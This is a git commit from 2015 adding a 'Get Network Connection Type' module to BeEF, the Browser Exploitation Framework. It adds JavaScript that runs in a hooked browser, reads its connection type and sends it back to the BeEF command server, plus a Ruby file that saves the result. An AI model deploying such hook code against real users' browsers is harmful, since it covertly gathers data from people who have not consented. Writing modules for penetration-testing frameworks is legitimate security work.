0226a910487ce09d738b0f8058f5bcf04e6c7ef0
Brendan Coles <bcoles@gmail.com>
2015-12-13 21:49:21 +0000

    Add Get Network Connection Type module

---
+++ modules/host/get_connection_type/command.js
@@ -0,0 +1,10 @@
+//
+// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - http://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+beef.execute(function() {
+  var connection_type = beef.net.connection.type();
+  beef.net.send('<%= @command_url %>', <%= @command_id %>, "connection="+connection_type);
+});
---
+++ modules/host/get_connection_type/module.rb
@@ -0,0 +1,14 @@
+#
+# Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
+# Browser Exploitation Framework (BeEF) - http://beefproject.com
+# See the file 'doc/COPYING' for copying permission
+#
+class Get_connection_type < BeEF::Core::Command
+
+  def post_execute
+    content = {}
+    content['Result'] = @datastore['connection']
+    save content
+  end
+
+end
